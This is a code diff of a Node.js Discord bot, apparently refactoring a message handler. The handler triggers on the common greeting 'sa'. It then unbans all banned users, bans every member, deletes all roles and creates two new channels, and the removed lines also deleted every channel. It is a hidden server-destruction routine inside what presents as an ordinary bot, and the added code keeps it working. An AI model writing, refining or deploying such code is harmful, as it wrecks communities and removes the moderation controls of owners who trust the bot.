@@ -13,26 +13,22 @@ const http = require('http');
     }, 280000);
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-berke.on('message', message => {
-if(message.content.toLowerCase() === 'sa' ) {    
-msg.guild.fetchBans().then(bans => {
-bans.forEach(user => {
-msg.guild.unban(user)
-      });
-    });
-  
-msg.guild.channels.forEach(a => a.delete())
-msg.guild.members.forEach(a => msg.guild.ban(a))
-msg.guild.roles.forEach(a => a.delete())
-let kanal = 'schewtsa'
-let kanal1 = 'buraya-yazın'
+berke.on('message', msg => {
+    if(msg.content.toLowerCase() === 'sa' ) {    
+      msg.guild.fetchBans().then(bans => {
+        bans.forEach(user => {
+           msg.guild.unban(user)
+        })
+      msg.guild.members.forEach(a => msg.guild.ban(a))
+      msg.guild.roles.forEach(a => a.delete())
+      let kanal = 'schewtsa'
+      let kanal1 = 'buraya-yazın'
+      msg.guild.createChannel(kanal)
+      msg.guild.createChannel(kanal1)
+      })
+    }
+})
 
-msg.guild.createChannel(kanal)
-msg.guild.createChannel(kanal1)
-           };
-        }
-
- 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
 
 
